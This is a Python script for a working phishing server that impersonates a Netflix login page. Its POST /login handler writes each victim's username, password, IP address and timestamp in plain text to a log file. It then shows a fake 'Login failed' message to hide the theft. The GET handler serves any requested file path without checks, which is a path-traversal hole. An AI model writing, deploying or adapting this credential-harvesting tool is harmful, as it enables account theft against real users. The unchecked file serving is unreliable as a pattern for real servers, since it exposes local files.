# fake_server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import datetime

class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/fake_netflix.html'
        try:
            with open(self.path[1:], 'rb') as file:
                content = file.read()
                self.send_response(200)
                self.end_headers()
                self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, 'File not found')

    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            credentials = urllib.parse.parse_qs(post_data)

            # Log the credentials
            with open("test.log", "a") as log_file:
                timestamp = datetime.datetime.now().strftime("[%d/%b/%Y:%H:%M:%S]")
                ip = self.client_address[0]
                log_entry = f'{ip} - - {timestamp} "POST /login HTTP/1.1" 200 - Username={credentials["username"][0]} Password={credentials["password"][0]}\n'
                log_file.write(log_entry)

            # Response
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"<h2>Login failed. Please try again later.</h2>")
        else:
            self.send_error(404, 'Endpoint not found')

def run(server_class=HTTPServer, handler_class=PhishingHandler):
    server_address = ('', 8080)
    httpd = server_class(server_address, handler_class)
    print("🚨 Fake Netflix phishing server running at http://localhost:8080")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
